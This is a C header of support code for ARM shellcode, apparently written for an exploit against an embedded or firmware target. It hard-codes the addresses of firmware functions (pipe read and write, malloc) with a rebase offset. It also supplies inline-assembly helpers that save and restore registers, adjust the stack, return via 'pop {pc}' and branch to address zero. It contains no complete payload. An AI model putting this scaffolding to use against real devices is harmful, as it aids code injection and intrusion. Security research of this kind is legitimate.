#ifndef STDLIBLUL
#define STDLIBLUL

#define DIE 0x0
#define REBASE 0x8F81FE00

//////////////////////////////////////////////////////////////
/// TYPEDEFS FOR FUNCITIONS THAT WE CALL IN THE SHELLCODE
//////////////////////////////////////////////////////////////
typedef int (*spipe_open_t)(int);
typedef int (*spipe_read_t)(int, char*, int, int);
typedef int (*spipe_write_t)(int, char*, int, int);
typedef int (*printk_t)(char*);

// size, __FILE__, __LINE__
typedef void* (*malloc_t)(int, char*, int);
//////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////
// Actual fn pointers
//////////////////////////////////////////////////////////////
#define SPIPE_OPEN_ADDR  (0x9022eff2 | 0x1)
#define SPIPE_READ_ADDR (0x9022effe | 0x1)
#define SPIPE_WRITE_ADDR (0x9022f010 | 0x1)    
#define MALLOC_ADDR ((0x0079f6a6 + REBASE) | 1)
//////////////////////////////////////////////////////////////


static __inline__ void store_context_and_lr(){
    asm volatile (
    "stmdb sp!, {r0-r11, lr}\n\t"
    :
    :
    : "memory"
    );
}

static __inline__ void restore_context_no_lr(){
    asm volatile(
    "ldmia sp!, {r0-r11}" 
    :
    :
    : "r0", "r1", "r2", "r3", "r4", "r5",
      "r6", "r7", "r8", "r9", "r10", "r11",
      "memory"
    );
}

static __inline__ void restore_context_and_lr(){
    asm volatile(
    "ldmia sp!, {r0-r11, lr}" 
    :
    :
    : "r0", "r1", "r2", "r3", "r4", "r5",
      "r6", "r7", "r8", "r9", "r10", "r11",
      "lr", "memory"
    );
}

static __inline__ void save_lr(void) {
    asm volatile(
        "push {lr}"
        :
        :
        : "memory"
    );
}

static __inline__ void make_space_stack(){
    asm volatile(
    "sub sp, #100"
    :
    :
    : "memory"
    );
}

static __inline__ void restore_space_stack(){
    asm volatile(
    "add sp, #100"
    :
    :
    : "memory"
    );
}

static __inline__ void ret(){
    asm volatile(
    "pop {pc}"
    :
    :
    : "memory"
    );
}
// __inline__ int memcmp(const void *s1, const void *s2, unsigned int n) {
//     const char *p1 = (const char *)s1;
//     const char *p2 = (const char *)s2;
//
//     for (unsigned int i = 0; i < n; i++) {
//         if (p1[i] != p2[i]) {
//             return p1[i] - p2[i];
//         }
//     }
//     return 0;
// }
//
// __inline__ void* memsearch(const void* haystack, unsigned int haystack_len, const void* needle, unsigned int needle_len) {
//     if (needle_len == 0 || haystack_len < needle_len) {
//         return 0;
//     }
//
//     const char* haystack_bytes = (const char*)haystack;
//     const char* needle_bytes = (const char*)needle;
//
//     for (unsigned int i = 0; i <= haystack_len - needle_len; ++i) {
//         if (haystack_bytes[i] == needle_bytes[0]) {
//             if (memcmp(&haystack_bytes[i], needle_bytes, needle_len) == 0) {
//                 return (void*)&haystack_bytes[i];
//             }
//         }
//     }
//
//     return 0;
// }
//
//
//
// [[maybe_unused]] void *memcpy(void *dest, const void *src, int n)
// {
//     for (int i = 0; i < n; i++)
//     {
//         ((char*)dest)[i] = ((char*)src)[i];
//     }
//     return dest;
// }
//
//
// [[maybe_unused]] int strlen(const char *s) {
//     const char *p = s;
//     while (*p) ++p;
//     return (int)(p - s);
// }
//
//
// [[maybe_unused]] static void byte_to_hex(unsigned char byte, char *hex_string) {
//     const char hex_digits[] = "0123456789ABCDEF\x00";
//     unsigned char high_nibble = (byte >> 4) & 0x0F;
//     unsigned char low_nibble = byte & 0x0F;
//     hex_string[0] = hex_digits[high_nibble];
//     hex_string[1] = hex_digits[low_nibble];
// }

[[maybe_unused]] static void die(){
	asm volatile (
	"movw r12, %[die]\n\t"       // Move DIE address into r1
	"bx r12\n\t"                 // Branch to DIE
	:                           // No output operands
	: [die] "i" (DIE)  	// Input operands (0x0)
	: "r12"                // Clobbered registers
	);
}
#endif
